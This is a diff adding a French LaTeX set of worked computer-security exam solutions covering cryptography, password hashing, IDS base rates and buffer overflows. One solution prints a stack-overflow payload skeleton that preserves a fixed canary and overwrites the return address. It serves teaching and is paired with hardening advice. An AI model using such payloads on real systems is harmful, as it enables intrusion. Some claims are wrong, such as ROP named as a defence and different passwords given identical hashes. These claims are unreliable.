@@ -1,0 +1,1252 @@
+\documentclass[a4paper,11pt]{article}
+
+% Packages
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+\usepackage{amsmath,amssymb,amsthm}
+\usepackage{geometry}
+\usepackage{hyperref}
+\usepackage{tcolorbox}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+
+% Geometry
+\geometry{margin=2.5cm}
+
+% Headers
+\pagestyle{fancy}
+\fancyhf{}
+\lhead{Sécurité Informatique}
+\rhead{Corrigés Examens}
+\cfoot{\thepage}
+
+% Colors
+\definecolor{solutionbg}{RGB}{230,245,255}
+\definecolor{warningbg}{RGB}{255,245,230}
+
+% Custom boxes
+\newtcolorbox{solution}{
+    colback=solutionbg,
+    colframe=blue!50!black,
+    title=Solution,
+    fonttitle=\bfseries
+}
+
+\newtcolorbox{important}{
+    colback=warningbg,
+    colframe=orange!80!black,
+    title=Point important,
+    fonttitle=\bfseries
+}
+
+% Title
+\title{\textbf{Sécurité Informatique}\\Corrigés des Examens}
+\author{Session Janvier 2024 \& Janvier 2025}
+\date{}
+
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+%==============================================================================
+\section{Examen Janvier 2024}
+%==============================================================================
+
+%------------------------------------------------------------------------------
+\subsection{Question 1 : Vrai ou Faux (10 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Q1.1 : Si un chiffrement satisfait la perfect security, alors $|K| \geq |M|$}
+
+\begin{solution}
+\textbf{Réponse : VRAI}
+
+\textbf{Justification :}
+
+Le théorème de Shannon stipule que pour qu'un système de chiffrement possède la perfect security, il faut obligatoirement que :
+$$|K| \geq |M|$$
+
+où $|K|$ est la taille de l'espace des clés et $|M|$ est la taille de l'espace des messages.
+
+\textbf{Intuition :} Si l'espace des clés est plus petit que l'espace des messages, un attaquant peut éliminer certains messages possibles en énumérant toutes les clés, ce qui viole la perfect security.
+
+\textbf{Exemple :} Le One-Time Pad (OTP) satisfait $|K| = |M|$ et possède la perfect security.
+\end{solution}
+
+\subsubsection{Q1.2 : Le One-Time Pad est pratique pour un usage quotidien}
+
+\begin{solution}
+\textbf{Réponse : FAUX}
+
+\textbf{Justification :}
+
+Le One-Time Pad (OTP), bien qu'offrant une perfect security théorique, est \textbf{totalement impratique} pour un usage quotidien pour plusieurs raisons :
+
+\begin{enumerate}
+    \item \textbf{Taille de la clé :} La clé doit être aussi longue que le message
+    \item \textbf{Distribution :} Comment partager de manière sécurisée une clé de plusieurs gigaoctets ?
+    \item \textbf{Usage unique :} Chaque clé ne peut être utilisée qu'une seule fois
+    \item \textbf{Stockage :} Nécessite un stockage sécurisé massif
+    \item \textbf{Génération :} Nécessite une source de vraie aléatoire (pas de PRNG)
+\end{enumerate}
+
+\textbf{Conclusion :} En pratique, on utilise des chiffrements comme AES avec des clés de 128/256 bits.
+\end{solution}
+
+\subsubsection{Q1.3 : Un PRG (Pseudo-Random Generator) sécurisé produit une sortie indistinguable d'un aléatoire vrai}
+
+\begin{solution}
+\textbf{Réponse : VRAI}
+
+\textbf{Justification :}
+
+La définition formelle de la sécurité d'un PRG stipule qu'un PRG $G: \{0,1\}^s \to \{0,1\}^n$ (avec $n > s$) est sécurisé si pour tout algorithme polynomial $A$ :
+
+$$\text{PRGadv}[A, G] = \left| \Pr[A(G(k)) = 1] - \Pr[A(r) = 1] \right| < \varepsilon$$
+
+où $k \leftarrow \{0,1\}^s$ (seed aléatoire) et $r \leftarrow \{0,1\}^n$ (aléatoire pur), et $\varepsilon$ est négligeable.
+
+\textbf{Interprétation :} Aucun adversaire computationnellement borné ne peut distinguer la sortie du PRG d'une séquence vraiment aléatoire avec une probabilité significative.
+\end{solution}
+
+\subsubsection{Q1.4 : AES-CBC nécessite un IV (Initialization Vector) aléatoire}
+
+\begin{solution}
+\textbf{Réponse : VRAI}
+
+\textbf{Justification :}
+
+Le mode CBC (Cipher Block Chaining) d'AES requiert un IV aléatoire pour garantir la sécurité CPA (Chosen-Plaintext Attack) :
+
+\begin{itemize}
+    \item \textbf{Chiffrement CBC :} $C_i = E_k(P_i \oplus C_{i-1})$ avec $C_0 = IV$
+    \item \textbf{Sécurité :} Si l'IV est prévisible ou réutilisé, un attaquant peut détecter des messages identiques
+    \item \textbf{Bonne pratique :} IV $\leftarrow \{0,1\}^{128}$ aléatoire, différent pour chaque message
+\end{itemize}
+
+\begin{important}
+L'IV doit être \textbf{aléatoire} pour CBC, mais seulement \textbf{unique} (nonce) pour CTR.
+\end{important}
+\end{solution}
+
+\subsubsection{Q1.5 : HMAC est vulnérable aux collisions de la fonction de hachage sous-jacente}
+
+\begin{solution}
+\textbf{Réponse : FAUX}
+
+\textbf{Justification :}
+
+HMAC est conçu spécifiquement pour être résistant aux collisions de la fonction de hachage :
+
+$$\text{HMAC}_k(m) = H\left((k \oplus \text{opad}) \| H((k \oplus \text{ipad}) \| m)\right)$$
+
+\textbf{Points clés :}
+\begin{itemize}
+    \item Même si $H$ est vulnérable aux collisions, HMAC reste sécurisé
+    \item HMAC-MD5 est encore considéré sécurisé pour l'authentification, alors que MD5 est cassé pour les collisions
+    \item La clé secrète $k$ protège contre les attaques par collision
+\end{itemize}
+
+\textbf{Note :} Cependant, on recommande SHA-256 par prudence moderne.
+\end{solution}
+
+\subsubsection{Q1.6 : bcrypt est préférable à SHA-256 pour le hachage de mots de passe}
+
+\begin{solution}
+\textbf{Réponse : VRAI}
+
+\textbf{Justification :}
+
+bcrypt est spécifiquement conçu pour le hachage de mots de passe, contrairement à SHA-256 :
+
+\begin{center}
+\begin{tabular}{|l|c|c|}
+\hline
+\textbf{Caractéristique} & \textbf{bcrypt} & \textbf{SHA-256} \\
+\hline
+Lenteur intentionnelle & \checkmark & $\times$ \\
+Facteur de coût ajustable & \checkmark & $\times$ \\
+Sel intégré & \checkmark & $\times$ \\
+Résistant GPU/ASIC & \checkmark & $\times$ \\
+\hline
+\end{tabular}
+\end{center}
+
+\textbf{Exemple :}
+\begin{itemize}
+    \item SHA-256 : $\sim 10^9$ hashes/sec sur GPU
+    \item bcrypt (cost=12) : $\sim 10$ hashes/sec
+\end{itemize}
+
+\textbf{Conclusion :} Toujours utiliser bcrypt, scrypt, Argon2 ou PBKDF2 pour les mots de passe.
+\end{solution}
+
+\subsubsection{Q1.7 : Un firewall stateful peut détecter les attaques au niveau applicatif}
+
+\begin{solution}
+\textbf{Réponse : FAUX}
+
+\textbf{Justification :}
+
+Un firewall \textbf{stateful} maintient l'état des connexions TCP/UDP (couches 3-4 OSI) mais ne comprend pas les protocoles applicatifs (couche 7) :
+
+\textbf{Firewall Stateful :}
+\begin{itemize}
+    \item Suit les connexions TCP (SYN, SYN-ACK, ACK)
+    \item Autorise les paquets de connexions établies
+    \item Ne regarde PAS le contenu des données
+\end{itemize}
+
+\textbf{Détection attaques applicatives :}
+\begin{itemize}
+    \item Injection SQL : Nécessite un \textbf{WAF} (Web Application Firewall)
+    \item XSS : Nécessite un WAF
+    \item Malware HTTP : Nécessite un IPS/IDS
+\end{itemize}
+
+\textbf{Conclusion :} Pour la sécurité applicative, on a besoin de WAF, IDS/IPS, ou proxies applicatifs.
+\end{solution}
+
+\subsubsection{Q1.8 : Un buffer overflow peut être exploité pour exécuter du code arbitraire}
+
+\begin{solution}
+\textbf{Réponse : VRAI}
+
+\textbf{Justification :}
+
+Le buffer overflow est une vulnérabilité classique permettant l'exécution de code arbitraire :
+
+\textbf{Mécanisme :}
+\begin{verbatim}
+Stack avant overflow:
++-----------------+
+| Return Address  | <- Cible
++-----------------+
+| Saved EBP       |
++-----------------+
+| buffer[64]      | <- Débordement
++-----------------+
+
+Stack après overflow:
++-----------------+
+| @shellcode      | <- Return écrasé !
++-----------------+
+| NOP NOP NOP     |
++-----------------+
+| Shellcode       | <- Code malveillant
++-----------------+
+\end{verbatim}
+
+\textbf{Exploitation :}
+\begin{enumerate}
+    \item Attaquant écrit au-delà du buffer
+    \item Écrase l'adresse de retour avec adresse du shellcode
+    \item Fonction retourne vers le shellcode
+    \item Shellcode s'exécute avec les privilèges du programme
+\end{enumerate}
+
+\textbf{Défenses modernes :} Stack canaries, NX bit, ASLR, ROP.
+\end{solution}
+
+\subsubsection{Q1.9 : ASLR (Address Space Layout Randomization) rend les buffer overflows impossibles}
+
+\begin{solution}
+\textbf{Réponse : FAUX}
+
+\textbf{Justification :}
+
+ASLR rend l'exploitation \textbf{plus difficile} mais pas \textbf{impossible} :
+
+\textbf{Ce que fait ASLR :}
+\begin{itemize}
+    \item Randomise les adresses mémoire (stack, heap, bibliothèques)
+    \item Force l'attaquant à deviner les adresses
+    \item Réduit la probabilité de succès d'une attaque
+\end{itemize}
+
+\textbf{Contournements possibles :}
+\begin{itemize}
+    \item \textbf{Information leak :} Fuites d'adresses mémoire
+    \item \textbf{Brute force :} Sur systèmes 32-bit (entropie limitée)
+    \item \textbf{ROP (Return-Oriented Programming) :} Utilise du code existant
+    \item \textbf{JIT Spray :} Dans les navigateurs
+\end{itemize}
+
+\textbf{Conclusion :} ASLR est une défense importante mais doit être combinée avec NX, canaries, et code sécurisé.
+\end{solution}
+
+\subsubsection{Q1.10 : Le chiffrement de bout en bout (E2EE) protège contre les attaques man-in-the-middle}
+
+\begin{solution}
+\textbf{Réponse : FAUX (avec nuance)}
+
+\textbf{Justification :}
+
+Le E2EE (End-to-End Encryption) seul ne protège \textbf{PAS automatiquement} contre les MITM :
+
+\textbf{Problème :}
+\begin{itemize}
+    \item E2EE chiffre les messages entre Alice et Bob
+    \item Mais comment Alice sait-elle qu'elle parle vraiment à Bob ?
+    \item Un attaquant peut établir deux connexions E2EE séparées :
+    \begin{itemize}
+        \item Alice $\leftrightarrow$ Attaquant (E2EE avec clé $k_1$)
+        \item Attaquant $\leftrightarrow$ Bob (E2EE avec clé $k_2$)
+    \end{itemize}
+\end{itemize}
+
+\textbf{Protection contre MITM :}
+\begin{itemize}
+    \item \textbf{Authentification des clés :} Vérification fingerprints (Signal, WhatsApp)
+    \item \textbf{PKI :} Certificats signés par autorité de confiance
+    \item \textbf{Key transparency :} Audits publics des clés
+\end{itemize}
+
+\textbf{Conclusion :} E2EE + authentification forte = protection MITM.
+\end{solution}
+
+%------------------------------------------------------------------------------
+\subsection{Question 2 : Rainbow Tables (5 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Énoncé}
+
+Comparez les Rainbow Tables et les Tables de Hellman classiques pour le craquage de mots de passe. Expliquez :
+\begin{enumerate}
+    \item Le principe de fonctionnement de chaque méthode
+    \item Les avantages des Rainbow Tables
+    \item L'impact du salage sur ces attaques
+\end{enumerate}
+
+\subsubsection{Solution}
+
+\begin{solution}
+\textbf{1. Principe de fonctionnement}
+
+\textbf{Tables de Hellman classiques :}
+
+\begin{itemize}
+    \item Utilise une seule fonction de réduction $R$
+    \item Crée des chaînes : $p_0 \xrightarrow{H} h_1 \xrightarrow{R} p_1 \xrightarrow{H} h_2 \xrightarrow{R} \ldots$
+    \item Stocke seulement $(p_{\text{début}}, p_{\text{fin}})$ pour chaque chaîne
+    \item \textbf{Problème :} Collisions de chaînes (merging chains)
+\end{itemize}
+
+\textbf{Exemple chaînes Hellman :}
+\begin{verbatim}
+Chaîne 1: password -> H -> a3f5... -> R -> admin123 -> ...
+Chaîne 2: letmein  -> H -> a3f5... -> R -> admin123 -> ...
+                            ^
+                            Collision ! Les chaînes fusionnent
+\end{verbatim}
+
+\textbf{Rainbow Tables :}
+
+\begin{itemize}
+    \item Utilise une fonction de réduction \textbf{différente à chaque étape} : $R_1, R_2, \ldots, R_t$
+    \item Chaînes : $p_0 \xrightarrow{H} h_1 \xrightarrow{R_1} p_1 \xrightarrow{H} h_2 \xrightarrow{R_2} p_2 \xrightarrow{H} \ldots$
+    \item \textbf{Avantage :} Élimine les collisions de chaînes !
+\end{itemize}
+
+\textbf{Exemple chaînes Rainbow :}
+\begin{verbatim}
+Chaîne 1: password -> H -> a3f5... -> R₁ -> admin123 -> H -> b2e8... -> R₂ -> ...
+Chaîne 2: letmein  -> H -> a3f5... -> R₁ -> user4567  -> H -> c9d3... -> R₂ -> ...
+                            ^                  ^
+                        Même hash         Différents mots (R₁ différent)
+                                         Pas de fusion !
+\end{verbatim}
+
+\textbf{2. Avantages des Rainbow Tables}
+
+\begin{enumerate}
+    \item \textbf{Pas de collisions de chaînes :}
+    \begin{itemize}
+        \item Hellman : $\sim 50\%$ des chaînes peuvent fusionner
+        \item Rainbow : Collisions éliminées par $R_i$ différents
+    \end{itemize}
+
+    \item \textbf{Meilleur taux de succès :}
+    \begin{itemize}
+        \item Pour même espace mémoire, Rainbow couvre plus de mots de passe
+        \item Efficacité : $\sim 2\times$ meilleure que Hellman
+    \end{itemize}
+
+    \item \textbf{Recherche plus rapide :}
+    \begin{itemize}
+        \item Moins de fausses alertes dues aux collisions
+        \item Recherche : $O(t^2)$ opérations pour une table de longueur $t$
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Compromis temps-mémoire :}
+
+\begin{center}
+\begin{tabular}{|l|c|c|}
+\hline
+\textbf{Méthode} & \textbf{Taux succès} & \textbf{Vitesse recherche} \\
+\hline
+Tables Hellman & $\sim 55\%$ & Moyenne \\
+Rainbow Tables & $\sim 99.9\%$ & Rapide \\
+\hline
+\end{tabular}
+\end{center}
+
+\textbf{3. Impact du salage}
+
+Le \textbf{salage} rend ces attaques \textbf{totalement inefficaces} :
+
+\textbf{Sans sel :}
+\begin{verbatim}
+password1 -> SHA256 -> 5e884898da...
+password2 -> SHA256 -> 5e884898da...  (même hash !)
+             ^
+             Rainbow table précalculée peut casser les deux
+\end{verbatim}
+
+\textbf{Avec sel :}
+\begin{verbatim}
+password1 + sel₁ -> SHA256 -> a7f3b8c2...
+password2 + sel₂ -> SHA256 -> 9d2e4f17...  (hashes différents)
+                    ^
+                    Nécessite rainbow table spécifique par sel !
+\end{verbatim}
+
+\textbf{Calcul :}
+\begin{itemize}
+    \item Sel de 128 bits $\Rightarrow 2^{128}$ sels possibles
+    \item Nécessiterait $2^{128}$ rainbow tables différentes
+    \item Espace requis : $\sim 10^{38}$ exaoctets (impossible !)
+\end{itemize}
+
+\textbf{Conclusion :}
+
+\begin{important}
+\textbf{Défense efficace :}
+\begin{itemize}
+    \item Utiliser un sel aléatoire unique par mot de passe
+    \item Sel de longueur $\geq 128$ bits
+    \item Stockage : \texttt{sel || hash(password || sel)}
+\end{itemize}
+
+Les rainbow tables deviennent alors \textbf{complètement inutilisables}.
+\end{important}
+\end{solution}
+
+%------------------------------------------------------------------------------
+\subsection{Question 3 : Buffer Overflow avec Protection (5 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Énoncé}
+
+Considérez le code C suivant avec une variable de garde (canary-like) :
+
+\begin{verbatim}
+void vulnerable(char *input) {
+    int guard = 0xDEADBEEF;
+    char buffer[64];
+    strcpy(buffer, input);
+
+    if (guard != 0xDEADBEEF) {
+        printf("Buffer overflow detected!\n");
+        exit(1);
+    }
+
+    printf("Input: %s\n", buffer);
+}
+\end{verbatim}
+
+Questions :
+\begin{enumerate}
+    \item Dessinez le stack frame de cette fonction
+    \item Un attaquant peut-il contourner cette protection ? Si oui, comment ?
+    \item Quelles améliorations proposeriez-vous ?
+\end{enumerate}
+
+\subsubsection{Solution}
+
+\begin{solution}
+\textbf{1. Stack frame}
+
+\textbf{Layout mémoire (x86 32-bit) :}
+
+\begin{verbatim}
+Adresses hautes
++-------------------+ <- EBP + 8
+| Argument: input   | (pointeur)
++-------------------+ <- EBP + 4
+| Return Address    | <- Cible ultime de l'attaque
++-------------------+ <- EBP
+| Saved EBP         |
++-------------------+ <- EBP - 4
+| guard (0xDEADBEEF)| <- "Canary" maison
++-------------------+ <- EBP - 8
+| buffer[60-63]     |
+| buffer[56-59]     |
+| ...               |
+| buffer[0-3]       | <- Début buffer (EBP - 72)
++-------------------+ <- ESP
+Adresses basses
+\end{verbatim}
+
+\textbf{Calcul des offsets :}
+\begin{itemize}
+    \item Buffer : EBP - 72 à EBP - 9 (64 bytes)
+    \item Guard : EBP - 8 à EBP - 5 (4 bytes, valeur 0xDEADBEEF)
+    \item Saved EBP : EBP - 4 à EBP - 1
+    \item Return Address : EBP + 4 à EBP + 7
+\end{itemize}
+
+\textbf{2. Contournement de la protection}
+
+\textbf{OUI, l'attaquant peut contourner facilement !}
+
+\textbf{Méthode 1 : Préserver le guard}
+
+L'attaquant construit un payload qui :
+\begin{enumerate}
+    \item Remplit le buffer (64 bytes)
+    \item Réécrit le guard avec la bonne valeur (0xDEADBEEF)
+    \item Continue à écraser saved EBP et return address
+\end{enumerate}
+
+\textbf{Payload :}
+\begin{verbatim}
+[64 bytes de padding] + [0xDEADBEEF] + [4 bytes padding] + [@shellcode]
+|<--  buffer       -->| |<- guard ->| |<- saved EBP ->| |<- ret addr->|
+\end{verbatim}
+
+\textbf{Exemple concret :}
+\begin{verbatim}
+payload = b'A' * 64                    # Remplir buffer
+payload += b'\xEF\xBE\xAD\xDE'        # Préserver guard (little-endian)
+payload += b'B' * 4                    # Écraser saved EBP
+payload += b'\x10\xD0\xFF\xBF'        # Adresse shellcode
+payload += shellcode                   # Code malveillant
+\end{verbatim}
+
+\textbf{Méthode 2 : Attaque avant la vérification}
+
+L'attaquant peut exploiter le \texttt{printf} avant la vérification :
+\begin{itemize}
+    \item Format string attack sur \texttt{printf("Input: \%s\textbackslash n", buffer)}
+    \item Fuite d'adresses mémoire
+    \item Exploitation indirecte
+\end{itemize}
+
+\textbf{3. Améliorations proposées}
+
+\begin{enumerate}
+    \item \textbf{Utiliser les stack canaries du compilateur :}
+    \begin{verbatim}
+gcc -fstack-protector-all vulnerable.c
+    \end{verbatim}
+    \begin{itemize}
+        \item Canary aléatoire placé par le compilateur
+        \item Valeur inconnue de l'attaquant
+        \item Vérification automatique avant \texttt{ret}
+    \end{itemize}
+
+    \item \textbf{Remplacer strcpy par strncpy :}
+    \begin{verbatim}
+strncpy(buffer, input, sizeof(buffer) - 1);
+buffer[sizeof(buffer) - 1] = '\0';
+    \end{verbatim}
+
+    \item \textbf{Utiliser des fonctions sécurisées :}
+    \begin{verbatim}
+// Mieux :
+snprintf(buffer, sizeof(buffer), "%s", input);
+
+// Encore mieux (C11) :
+strncpy_s(buffer, sizeof(buffer), input, _TRUNCATE);
+    \end{verbatim}
+
+    \item \textbf{Activer toutes les protections :}
+    \begin{verbatim}
+gcc -fstack-protector-all \  # Stack canaries
+    -D_FORTIFY_SOURCE=2 \     # Checks runtime
+    -pie -fPIE \              # ASLR
+    -Wl,-z,relro \            # GOT protection
+    -Wl,-z,now \              # Lazy binding désactivé
+    -Wl,-z,noexecstack \      # NX bit
+    vulnerable.c
+    \end{verbatim}
+
+    \item \textbf{Validation d'entrée :}
+    \begin{verbatim}
+if (strlen(input) >= sizeof(buffer)) {
+    fprintf(stderr, "Input too long!\n");
+    exit(1);
+}
+    \end{verbatim}
+\end{enumerate}
+
+\textbf{Code sécurisé complet :}
+
+\begin{verbatim}
+void secure(const char *input) {
+    char buffer[64];
+
+    // Validation longueur
+    if (strlen(input) >= sizeof(buffer)) {
+        fprintf(stderr, "Error: Input exceeds buffer size\n");
+        return;
+    }
+
+    // Copie sécurisée
+    strncpy(buffer, input, sizeof(buffer) - 1);
+    buffer[sizeof(buffer) - 1] = '\0';
+
+    // Affichage sécurisé (pas de format string vuln)
+    printf("Input: ");
+    fputs(buffer, stdout);
+    printf("\n");
+}
+\end{verbatim}
+
+\begin{important}
+\textbf{Leçons clés :}
+\begin{itemize}
+    \item Un canary maison avec valeur connue est \textbf{inutile}
+    \item Toujours utiliser les protections du compilateur
+    \item Défense en profondeur : canaries + NX + ASLR + code sûr
+    \item \textbf{Jamais de strcpy} en production !
+\end{itemize}
+\end{important}
+\end{solution}
+
+\newpage
+
+%==============================================================================
+\section{Examen Janvier 2025}
+%==============================================================================
+
+%------------------------------------------------------------------------------
+\subsection{Question 1 : Sécurité PRG (7 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Énoncé}
+
+\textbf{Partie A :} Donnez la définition formelle de la sécurité d'un PRG (Pseudo-Random Generator).
+
+\textbf{Partie B :} Considérez le PRG suivant défini sur $\{0,1\}^{128}$ :
+$$G(s) = s \| \text{AES}_s(0^{128})$$
+où $s$ est une clé de 128 bits et $\text{AES}_s$ est le chiffrement AES avec la clé $s$.
+
+Est-ce un PRG sécurisé ? Justifiez votre réponse.
+
+\textbf{Partie C :} Proposez un PRG manifestement \textbf{insécurisé} et prouvez qu'il ne satisfait pas la définition de sécurité.
+
+\subsubsection{Solution}
+
+\begin{solution}
+\textbf{Partie A : Définition formelle}
+
+Un PRG (Pseudo-Random Generator) est une fonction déterministe :
+$$G: \{0,1\}^s \to \{0,1\}^n$$
+avec $n > s$ (expansion), qui est \textbf{sécurisé} si pour tout adversaire polynomial probabiliste $A$ :
+
+$$\text{PRGadv}[A, G] = \left| \Pr_{k \leftarrow \{0,1\}^s}[A(G(k)) = 1] - \Pr_{r \leftarrow \{0,1\}^n}[A(r) = 1] \right| < \varepsilon$$
+
+où $\varepsilon$ est \textbf{négligeable} en $s$.
+
+\textbf{Interprétation :}
+\begin{itemize}
+    \item \textbf{Expérience 0 :} $A$ reçoit $G(k)$ avec $k$ aléatoire (pseudo-aléatoire)
+    \item \textbf{Expérience 1 :} $A$ reçoit $r$ vraiment aléatoire
+    \item $A$ doit deviner quelle expérience (sortie 0 ou 1)
+    \item Si $G$ est sécurisé : avantage de $A$ est négligeable
+\end{itemize}
+
+\textbf{Négligeable :} $\varepsilon(s) = o(1/s^c)$ pour tout $c$, par exemple $\varepsilon(s) = 2^{-s/2}$.
+
+\textbf{Partie B : Analyse de $G(s) = s \| \text{AES}_s(0^{128})$}
+
+\textbf{Réponse : NON, ce n'est PAS un PRG sécurisé.}
+
+\textbf{Attaque par distingueur :}
+
+Algorithme distingueur $A$ :
+\begin{enumerate}
+    \item Recevoir $w \in \{0,1\}^{256}$
+    \item Parser $w = w_1 \| w_2$ avec $|w_1| = |w_2| = 128$
+    \item Calculer $c = \text{AES}_{w_1}(0^{128})$
+    \item Si $c = w_2$ : retourner 1 (pseudo-aléatoire)
+    \item Sinon : retourner 0 (aléatoire pur)
+\end{enumerate}
+
+\textbf{Analyse des probabilités :}
+
+\textbf{Si $w = G(s)$} (pseudo-aléatoire) :
+\begin{itemize}
+    \item $w = s \| \text{AES}_s(0^{128})$
+    \item Donc $w_1 = s$ et $w_2 = \text{AES}_s(0^{128})$
+    \item Test : $\text{AES}_{w_1}(0^{128}) = \text{AES}_s(0^{128}) = w_2$ ✓
+    \item $\Pr[A(G(s)) = 1] = 1$
+\end{itemize}
+
+\textbf{Si $w = r$} (aléatoire pur) :
+\begin{itemize}
+    \item $w = r_1 \| r_2$ avec $r_1, r_2$ indépendants et aléatoires
+    \item Test : $\text{AES}_{r_1}(0^{128}) \stackrel{?}{=} r_2$
+    \item Probabilité de collision : $\Pr[\text{AES}_{r_1}(0^{128}) = r_2] = 1/2^{128}$ (négligeable)
+    \item $\Pr[A(r) = 1] \approx 0$
+\end{itemize}
+
+\textbf{Avantage du distingueur :}
+$$\text{PRGadv}[A, G] = |1 - 0| = 1$$
+
+Cet avantage est \textbf{non négligeable}, donc $G$ n'est \textbf{PAS sécurisé}.
+
+\begin{important}
+\textbf{Problème :} Exposer la clé $s$ en clair permet à l'adversaire de calculer $\text{AES}_s(0^{128})$ lui-même et de détecter la structure.
+\end{important}
+
+\textbf{Partie C : PRG manifestement insécurisé}
+
+\textbf{Proposition :} PRG qui retourne les 128 premiers bits à zéro :
+$$G_{\text{bad}}(s) = 0^{128} \| s$$
+
+où $s \in \{0,1\}^{128}$.
+
+\textbf{Preuve d'insécurité :}
+
+Distingueur trivial $A$ :
+\begin{enumerate}
+    \item Recevoir $w \in \{0,1\}^{256}$
+    \item Parser $w = w_1 \| w_2$ avec $|w_1| = 128$
+    \item Si $w_1 = 0^{128}$ : retourner 1
+    \item Sinon : retourner 0
+\end{enumerate}
+
+\textbf{Calcul des probabilités :}
+
+$$\Pr[A(G_{\text{bad}}(s)) = 1] = \Pr[w_1 = 0^{128} | w = 0^{128} \| s] = 1$$
+
+$$\Pr[A(r) = 1] = \Pr[r_1 = 0^{128} | r \leftarrow \{0,1\}^{256}] = \frac{1}{2^{128}}$$
+
+\textbf{Avantage :}
+$$\text{PRGadv}[A, G_{\text{bad}}] = \left| 1 - \frac{1}{2^{128}} \right| \approx 1$$
+
+Cet avantage est \textbf{écrasant} ($\approx 1$), donc $G_{\text{bad}}$ est \textbf{totalement insécurisé}.
+
+\textbf{Autre exemple :} PRG qui copie le seed :
+$$G_{\text{copy}}(s) = s \| s$$
+
+Distingueur : vérifier si les deux moitiés sont identiques.
+
+$$\Pr[A(G_{\text{copy}}(s)) = 1] = 1$$
+$$\Pr[A(r) = 1] = 1/2^{128}$$
+$$\text{PRGadv}[A, G_{\text{copy}}] \approx 1$$
+\end{solution}
+
+%------------------------------------------------------------------------------
+\subsection{Question 2 : IDS et Base-Rate Fallacy (6 points)}
+%------------------------------------------------------------------------------
+
+\subsubsection{Énoncé}
+
+Un IDS (Intrusion Detection System) a les caractéristiques suivantes :
+\begin{itemize}
+    \item Taux de détection (True Positive Rate) : TPR = 99\%
+    \item Taux de faux positifs (False Positive Rate) : FPR = 1\%
+\end{itemize}
+
+Dans un réseau où seulement 0.1\% du trafic est malveillant :
+
+\textbf{Question :} Si l'IDS déclenche une alerte, quelle est la probabilité que ce soit réellement une attaque ?
+
+Utilisez le théorème de Bayes et expliquez le phénomène de "base-rate fallacy".
+
+\subsubsection{Solution}
+
+\begin{solution}
+\textbf{Données :}
+\begin{itemize}
+    \item $\Pr[\text{Attaque}] = 0.001$ (0.1\% du trafic est malveillant)
+    \item $\Pr[\text{Normal}] = 0.999$ (99.9\% du trafic est légitime)
+    \item $\Pr[\text{Alerte} | \text{Attaque}] = 0.99$ (TPR)
+    \item $\Pr[\text{Alerte} | \text{Normal}] = 0.01$ (FPR)
+\end{itemize}
+
+\textbf{Question :} Calculer $\Pr[\text{Attaque} | \text{Alerte}]$ (probabilité qu'une alerte soit une vraie attaque).
+
+\textbf{Théorème de Bayes :}
+
+$$\Pr[\text{Attaque} | \text{Alerte}] = \frac{\Pr[\text{Alerte} | \text{Attaque}] \times \Pr[\text{Attaque}]}{\Pr[\text{Alerte}]}$$
+
+\textbf{Étape 1 : Calculer $\Pr[\text{Alerte}]$}
+
+Par la loi des probabilités totales :
+
+$$\Pr[\text{Alerte}] = \Pr[\text{Alerte} | \text{Attaque}] \times \Pr[\text{Attaque}] + \Pr[\text{Alerte} | \text{Normal}] \times \Pr[\text{Normal}]$$
+
+$$\Pr[\text{Alerte}] = 0.99 \times 0.001 + 0.01 \times 0.999$$
+
+$$\Pr[\text{Alerte}] = 0.00099 + 0.00999 = 0.01098$$
+
+\textbf{Étape 2 : Appliquer Bayes}
+
+$$\Pr[\text{Attaque} | \text{Alerte}] = \frac{0.99 \times 0.001}{0.01098} = \frac{0.00099}{0.01098} \approx 0.0901$$
+
+\textbf{Résultat :}
+
+\begin{important}
+\textbf{Probabilité qu'une alerte soit une vraie attaque : $\approx 9\%$ seulement !}
+
+Malgré un IDS avec 99\% de précision, \textbf{91\% des alertes sont des faux positifs}.
+\end{important}
+
+\textbf{Tableau récapitulatif :}
+
+Sur 100,000 connexions :
+
+\begin{center}
+\begin{tabular}{|l|c|c|c|}
+\hline
+\textbf{} & \textbf{Attaque réelle} & \textbf{Trafic normal} & \textbf{Total} \\
+\hline
+\textbf{Alerte déclenchée} & 99 (TP) & 999 (FP) & 1098 \\
+\hline
+\textbf{Pas d'alerte} & 1 (FN) & 98,901 (TN) & 98,902 \\
+\hline
+\textbf{Total} & 100 & 99,900 & 100,000 \\
+\hline
+\end{tabular}
+\end{center}
+
+\textbf{Métriques :}
+\begin{itemize}
+    \item Vrais positifs (TP) : $100 \times 0.99 = 99$
+    \item Faux négatifs (FN) : $100 \times 0.01 = 1$
+    \item Faux positifs (FP) : $99{,}900 \times 0.01 = 999$
+    \item Vrais négatifs (TN) : $99{,}900 \times 0.99 = 98{,}901$
+\end{itemize}
+
+\textbf{Précision positive (PPV) :}
+$$\text{PPV} = \frac{\text{TP}}{\text{TP} + \text{FP}} = \frac{99}{99 + 999} = \frac{99}{1098} \approx 0.09 = 9\%$$
+
+\textbf{Le phénomène de "Base-Rate Fallacy"}
+
+La \textbf{base-rate fallacy} est une erreur cognitive qui consiste à ignorer la prévalence de base (taux de base) d'un événement.
+
+\textbf{Intuition erronée :}
+\begin{itemize}
+    \item "Mon IDS a 99\% de précision"
+    \item $\Rightarrow$ "Si une alerte se déclenche, il y a 99\% de chances que ce soit une attaque"
+    \item \textbf{FAUX !}
+\end{itemize}
+
+\textbf{Réalité :}
+\begin{itemize}
+    \item Le taux de base des attaques est très faible (0.1\%)
+    \item Même avec 1\% de FPR, il y a \textbf{beaucoup plus de trafic normal} que de trafic malveillant
+    \item $99{,}900$ connexions normales $\times$ 1\% FPR = 999 fausses alertes
+    \item $100$ attaques réelles $\times$ 99\% TPR = 99 vraies alertes
+    \item $\Rightarrow$ Ratio de 999:99 $\approx$ 10:1 en faveur des faux positifs
+\end{itemize}
+
+\textbf{Conséquences pratiques :}
+
+\begin{enumerate}
+    \item \textbf{Fatigue des alertes :} Les analystes ignorent les alertes (cry-wolf effect)
+    \item \textbf{Coût opérationnel :} Triage de milliers de faux positifs
+    \item \textbf{Attaques manquées :} Les vraies attaques noyées dans le bruit
+\end{enumerate}
+
+\textbf{Solutions :}
+
+\begin{itemize}
